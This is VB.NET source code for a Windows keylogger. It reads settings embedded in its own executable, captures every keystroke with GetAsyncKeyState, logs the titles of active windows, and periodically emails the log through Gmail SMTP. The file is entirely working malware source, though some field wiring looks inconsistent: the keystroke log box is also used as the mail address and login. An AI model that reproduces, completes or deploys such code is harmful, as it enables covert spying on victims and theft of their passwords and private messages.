Imports System.IO
Imports System.Net.Mail
Imports Microsoft.Win32
Public Class Form1
    Dim options(), text1, text2 As String
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
    Dim result As Integer
    Const FileSplit = "@keylogger@"
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        FileGet(1, text1)
        FileGet(1, text2)
        FileClose(1)
        options = Split(text1, FileSplit)
        TextBox2.Text = options(1)
        TextBox3.Text = options(2)
        Timer1.Start()
        Timer2.Start()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim MailSetup As New MailMessage
        MailSetup.Subject = My.Computer.Name & ":"
        MailSetup.To.Add(TextBox1.Text)
        MailSetup.From = New MailAddress(TextBox1.Text)
        MailSetup.Body = TextBox1.Text
        Dim SMTP As New SmtpClient("smtp.gmail.com")
        SMTP.Port = 587
        SMTP.EnableSsl = True
        SMTP.Credentials = New Net.NetworkCredential(TextBox1.Text, TextBox2.Text)
        SMTP.Send(MailSetup)
        TextBox3.Clear()
    End Sub
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Dim strin As String = Nothing

    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If strin <> GetActiveWindowTitle() Then
            TextBox1.Text = TextBox1.Text + vbNewLine & "[" & GetActiveWindowTitle() & "]:" + vbNewLine
            strin = GetActiveWindowTitle()
        End If
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        For i = 1 To 255
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                TextBox1.Text = TextBox1.Text + Chr(i)
            End If
        Next i

    End Sub
End Class
